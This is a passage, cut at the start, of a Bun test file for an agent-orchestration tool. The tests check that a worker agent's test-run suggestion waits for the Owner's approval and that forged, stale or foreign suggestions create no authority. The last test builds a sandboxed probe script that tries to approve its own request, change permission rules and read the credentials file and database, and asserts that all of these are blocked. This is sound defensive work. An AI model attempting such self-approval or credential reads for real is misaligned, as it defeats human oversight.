  await permissions.approveOnce(request.id, approvalBody(request));
  const requestRow = () => JSON.stringify(store.db.query(`SELECT * FROM project_permission_requests WHERE id = ?`).get(request.id));
  const rows = requestRow();
  const task = taskRowJson(taskId);
  const counts = tableCounts();
  const attempts = spawnAttempts;
  const journal = store.db.query<{ n: number }, []>(`SELECT COUNT(*) AS n FROM activity_events`).get()?.n;
  for (let i = 0; i < 10; i++) {
    permissions.readProjectTestEvidence(taskId);
    permissions.previewProjectTest(taskId);
    permissions.readProjectPermissions();
  }
  expect(requestRow()).toBe(rows);
  expect(taskRowJson(taskId)).toBe(task);
  expect(tableCounts()).toEqual(counts);
  expect(spawnAttempts).toBe(attempts);
  expect(store.db.query<{ n: number }, []>(`SELECT COUNT(*) AS n FROM activity_events`).get()?.n).toBe(journal);
});

// ------------------------------------------------------------------ worker suggestion (request-only)

const SUGGEST_TAG = '<project_test_request>{"action":"run_project_test"}</project_test_request>';

function developerRunOf(taskId: string): string {
  const id = workspace.getTaskWorkspace(taskId)?.developerRunId;
  if (!id) throw new Error("no Developer run bound to the workspace");
  return id;
}

function requestsOf(taskId: string) {
  return store.db.query<{ id: string; status: string; origin: string; origin_run_id: string | null }, [string]>(
    `SELECT id, status, origin, origin_run_id FROM project_permission_requests WHERE task_id = ? ORDER BY created_at`,
  ).all(taskId);
}

async function waitForRequests(taskId: string, count: number): Promise<void> {
  for (let i = 0; i < 150 && requestsOf(taskId).length < count; i++) await Bun.sleep(20);
}

test("worker: a settled worker's suggestion becomes ONE pending request, starts nothing, and only the Owner's Allow once runs it", async () => {
  const before = spawnAttempts;
  const { dir, taskId } = await settledTask("worker-flow", "__agetor_fake_worker_test_request__");
  await waitForRequests(taskId, 1);
  const runId = developerRunOf(taskId);
  const rows = requestsOf(taskId);
  expect(rows).toHaveLength(1);
  expect(rows[0]).toMatchObject({ status: "pending", origin: "worker", origin_run_id: runId });
  expect(spawnAttempts).toBe(before);
  const request = permissions.getRequest(rows[0]!.id)!;
  // The command, directory and fingerprints were derived by the core, not named by the worker.
  expect(request.command).toBe("bun test ./src/clamp.test.ts");
  expect(request.cwd).toContain("task-workspaces");
  expect(request.projectPath).toBe(dir);
  expect(request.origin).toBe("worker");
  expect(request.originRunId).toBe(runId);
  // It shows in the existing Owner inbox, marked as worker-suggested.
  const inbox = ownerActions.readOwnerActions().projectPermissionRequests?.find((row) => row.id === request.id);
  expect(inbox?.origin).toBe("worker");
  // Repeated delivery of the same suggestion (replayed settle, re-read) creates nothing and runs nothing.
  for (let i = 0; i < 3; i++) {
    const again = permissions.ingestWorkerTestSuggestion(runId);
    expect(again.outcome).toBe("duplicate");
  }
  expect(requestsOf(taskId)).toHaveLength(1);
  expect(spawnAttempts).toBe(before);
  // The Owner decides. One real offline run.
  const done = await permissions.approveOnce(request.id, approvalBody(request));
  expect(done.status).toBe("completed");
  expect(done.authority).toBe("owner-once");
  expect(done.exitCode).toBe(0);
  expect(spawnAttempts).toBe(before + 1);
  const evidence = permissions.readProjectTestEvidence(taskId);
  expect(evidence.kind).toBe("passed");
  expect(evidence.latest?.requestId).toBe(request.id);
  expect(evidence.currentPass).toBe(true);
  // Redelivery AFTER the decision still creates no new request and no second run.
  expect(permissions.ingestWorkerTestSuggestion(runId).outcome).toBe("duplicate");
  expect(requestsOf(taskId)).toHaveLength(1);
  expect(spawnAttempts).toBe(before + 1);
  // QC, Done and the practical-attempt state are untouched by a worker request or its result.
  const task = store.tasks.get(taskId)!;
  expect(task.column).not.toBe("done");
  expect(task.qcState?.latestVerdict ?? null).toBeNull();
});

test("worker: a forged body, a wrong action, no tag or a quoted tag creates no authority", async () => {
  const forged = await settledTask("worker-forged", "__agetor_fake_worker_test_request__:forged");
  await waitForRequests(forged.taskId, 1);
  const [row] = requestsOf(forged.taskId);
  expect(row?.status).toBe("pending");
  const request = permissions.getRequest(row!.id)!;
  // The worker's command, cwd, approve and allow fields are ignored: the derived fixed test is what waits.
  expect(request.command).toBe("bun test ./src/clamp.test.ts");
  expect(request.cwd).not.toBe("/");
  expect(request.status).toBe("pending");
  expect(request.authority).toBeNull();
  expect(permissions.listRules(forged.dir)).toHaveLength(0);

  const bad = await settledTask("worker-bad-action", "__agetor_fake_worker_test_request__:bad-action");
  await Bun.sleep(300);
  expect(requestsOf(bad.taskId)).toHaveLength(0);
  const none = await settledTask("worker-no-tag");
  await Bun.sleep(300);
  expect(requestsOf(none.taskId)).toHaveLength(0);
  // Text that is not a closed, final, exact tag is ignored.
  for (const text of [
    "<project_test_request>{\"action\":\"run_project_test\"}",
    `${SUGGEST_TAG}\n<project_test_request>{"action":"other"}</project_test_request>`,
    "<project_test_request>not json</project_test_request>",
    '<project_test_request>["run_project_test"]</project_test_request>',
    "",
  ]) {
    expect(permissions.suggestProjectTestFromWorker({ runId: developerRunOf(none.taskId), text }).outcome).toBe("ignored");
  }
  expect(requestsOf(none.taskId)).toHaveLength(0);
});

test("worker: a Deny rule wins and records a denial; an exact Allow rule does NOT start a worker suggestion", async () => {
  const denied = await settledTask("worker-deny");
  permissions.setProjectDefault(denied.dir, "deny");
  const before = spawnAttempts;
  const outcome = permissions.suggestProjectTestFromWorker({ runId: developerRunOf(denied.taskId), text: SUGGEST_TAG });
  expect(outcome).toMatchObject({ outcome: "requested", status: "denied" });
  expect(requestsOf(denied.taskId)).toEqual([expect.objectContaining({ status: "denied", origin: "worker" })]);
  expect(spawnAttempts).toBe(before);
  permissions.setProjectDefault(denied.dir, "ask");

  const allowed = await settledTask("worker-allow-rule");
  permissions.addAllowRule(allowed.dir, "bun test ./src/clamp.test.ts");
  const result = permissions.suggestProjectTestFromWorker({ runId: developerRunOf(allowed.taskId), text: SUGGEST_TAG });
  expect(result).toMatchObject({ outcome: "requested", status: "pending" });
  const [row] = requestsOf(allowed.taskId);
  expect(row).toMatchObject({ status: "pending", origin: "worker" });
  expect(permissions.getRequest(row!.id)?.authority).toBeNull();
  expect(spawnAttempts).toBe(before);
  // The Owner's own request, by contrast, keeps the existing rule behaviour (runs under the allow rule).
  const owner = await settledTask("worker-allow-owner");
  permissions.addAllowRule(owner.dir, "bun test ./src/clamp.test.ts");
  const ran = await permissions.requestProjectTest({ taskId: owner.taskId });
  expect(ran.status).toBe("completed");
  expect(ran.origin).toBe("owner");
});

test("worker: stale or foreign run context creates nothing and cannot be approved into a launch", async () => {
  const before = spawnAttempts;
  // A run that does not exist, and a run id of another task paired with nothing else the worker controls.
  expect(permissions.suggestProjectTestFromWorker({ runId: "no-such-run", text: SUGGEST_TAG })).toMatchObject({ outcome: "ignored", code: "run" });

  const a = await settledTask("worker-stale-a");
  const b = await settledTask("worker-stale-b");
  const runA = developerRunOf(a.taskId);
  // A newer run now owns task A: the old run's suggestion is stale at ingestion.
  store.db.run(`UPDATE tasks SET run_id = ? WHERE id = ?`, ["newer-run", a.taskId]);
  expect(permissions.suggestProjectTestFromWorker({ runId: runA, text: SUGGEST_TAG })).toMatchObject({ outcome: "ignored", code: "stale-run" });
  store.db.run(`UPDATE tasks SET run_id = ? WHERE id = ?`, [runA, a.taskId]);
  // The suggestion binds to its own run's task. It can never create a request for task B.
  const result = permissions.suggestProjectTestFromWorker({ runId: runA, text: SUGGEST_TAG });
  expect(result.outcome).toBe("requested");
  expect(requestsOf(b.taskId)).toHaveLength(0);
  expect(requestsOf(a.taskId)).toHaveLength(1);

  // Staleness AFTER the ask: the approval is spent, nothing starts.
  const pending = permissions.getRequest(requestsOf(a.taskId)[0]!.id)!;
  store.db.run(`UPDATE tasks SET run_id = ? WHERE id = ?`, ["newer-run", a.taskId]);
  const blocked = await permissions.approveOnce(pending.id, approvalBody(pending));
  expect(blocked.status).toBe("blocked");
  expect(blocked.reason).toMatch(/latest run/);
  expect(spawnAttempts).toBe(before);
  store.db.run(`UPDATE tasks SET run_id = ? WHERE id = ?`, [runA, a.taskId]);

  // A review run, or a run that did not succeed, cannot suggest.
  const c = await settledTask("worker-stale-c");
  const runC = developerRunOf(c.taskId);
  store.db.run(`UPDATE runs SET status = 'failed' WHERE id = ?`, [runC]);
  expect(permissions.suggestProjectTestFromWorker({ runId: runC, text: SUGGEST_TAG })).toMatchObject({ outcome: "ignored", code: "run" });
  store.db.run(`UPDATE runs SET status = 'succeeded' WHERE id = ?`, [runC]);
  // Emergency Stop and a changed workspace owner also stop the suggestion.
  autonomyPolicyStore.writeEmergency(true, "test", []);
  expect(permissions.suggestProjectTestFromWorker({ runId: runC, text: SUGGEST_TAG })).toMatchObject({ outcome: "ignored", code: "emergency-stop" });
  autonomyPolicyStore.writeEmergency(false, null, []);
  expect(requestsOf(c.taskId)).toHaveLength(0);
  expect(spawnAttempts).toBe(before);
});

test("worker: a sandboxed worker's suggestion reaches the Owner inbox, but the worker cannot approve, change rules or read credentials", async () => {
  const before = spawnAttempts;
  const { dir, taskId } = await settledTask("worker-isolated");
  const runId = developerRunOf(taskId);
  let hits = 0;
  const seen: string[] = [];
  const listener = Bun.serve({ port: 0, hostname: "127.0.0.1", fetch(req) { hits += 1; seen.push(new URL(req.url).pathname); return Response.json({ ok: true }); } });
  const activeDataDir = store.dataDir;
  const credsFile = path.join(activeDataDir, "agetor-core.json");
  writeFileSync(credsFile, JSON.stringify({ port: listener.port, token: "synthetic-token", pid: process.pid }), { mode: 0o600 });
  const wProject = path.join(root, "worker-probe", "project");
  const wScratch = path.join(root, "worker-probe", "scratch");
  mkdirSync(wProject, { recursive: true });
  mkdirSync(wScratch, { recursive: true });
  chmodSync(wScratch, 0o700);
  // The deterministic worker: tries every Owner-side action it could think of, then emits only the structured suggestion.
  writeFileSync(path.join(wProject, "worker.ts"), `
import { readFileSync } from "node:fs";
const out: Record<string, string | number> = {};
const base = "http://127.0.0.1:${listener.port}";
for (const [name, route, body] of [
  ["approve", "/project-permissions/requests/x/approve", "{}"],
  ["rules", "/project-permissions/rules", JSON.stringify({ projectPath: ${JSON.stringify(dir)}, command: "bun test ./src/clamp.test.ts" })],
  ["default", "/project-permissions/default", JSON.stringify({ projectPath: ${JSON.stringify(dir)}, mode: "ask" })],
] as const) {
  try { const r = await fetch(base + route, { method: "POST", headers: { authorization: "Bearer synthetic-token" }, body }); out[name] = r.status; }
  catch { out[name] = "blocked"; }
}
for (const [name, file] of [["creds", ${JSON.stringify(credsFile)}], ["db", ${JSON.stringify(path.join(activeDataDir, "agetor.sqlite"))}]] as const) {
  try { out[name] = readFileSync(file).length; } catch (e) { out[name] = "blocked:" + (e as NodeJS.ErrnoException).code; }
}
console.log("PROBE " + JSON.stringify(out));
console.log(${JSON.stringify(SUGGEST_TAG)});
`);
  try {
    const chunks: string[] = [];
    const host = createBunProcessHost({ perlAvailable: false });
    const b = boundary.createOfflineMacosBoundary({ project: realpathSync(wProject), scratch: realpathSync(wScratch), role: "developer", executable: process.execPath });
    const started = await host.start(boundary.offlineBoundaryRequest(b, ["run", "./worker.ts"], "d".repeat(32), (_s, text) => chunks.push(text)));
    if (!started.ok) throw new Error(started.detail);
    await started.process.exited;
    const stdout = chunks.join("");
    const probe = JSON.parse((stdout.split("\n").find((l) => l.startsWith("PROBE ")) ?? "PROBE {}").slice(6));
    // What the worker could do: nothing on the Owner side.
    expect(probe.approve).toBe("blocked");
    expect(probe.rules).toBe("blocked");
    expect(probe.default).toBe("blocked");
    expect(String(probe.creds)).toMatch(/^blocked/);
    expect(String(probe.db)).toMatch(/^blocked/);
    expect(hits).toBe(0);
    expect(permissions.listRules(dir)).toHaveLength(0);
    // What it could do: print the structured suggestion. The core reads that text for the run it already knows.
    const result = permissions.suggestProjectTestFromWorker({ runId, text: stdout });
    expect(result).toMatchObject({ outcome: "requested", status: "pending" });
    expect(requestsOf(taskId)).toEqual([expect.objectContaining({ status: "pending", origin: "worker", origin_run_id: runId })]);
    expect(spawnAttempts).toBe(before);
    expect(permissions.listRules(dir)).toHaveLength(0);
    expect(permissions.getRequest(requestsOf(taskId)[0]!.id)?.authority).toBeNull();
  } finally {
    listener.stop(true);
    rmSync(credsFile, { force: true });
  }
});
